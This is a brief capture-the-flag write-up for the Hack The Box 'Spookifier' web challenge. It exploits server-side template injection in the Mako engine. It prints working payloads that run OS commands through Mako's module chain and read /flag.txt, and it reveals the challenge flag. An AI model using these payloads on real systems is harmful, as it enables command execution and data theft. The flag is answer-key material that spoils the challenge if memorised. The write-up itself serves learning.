# Spookifier - web challenge

So here we have an SSTI vuln

The template engine is Mako, reading from payloads and all the things we get to come up with with a payload to get the flag as we need it

- to automate you can use tplmap.py

this one did not work as it was not able to get a shell on the system

`${self.module.cache.util.os.system("id")}` from payloads all the things did not quite work as intended so tried to get it work and adjust for our needs..

`{7*7}`

url encoded the command to get the flag

checked for the root directory content

`?text=${self.module.cache.util.os.popen("cat /flag.txt").read()}`

Flag:`HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}`
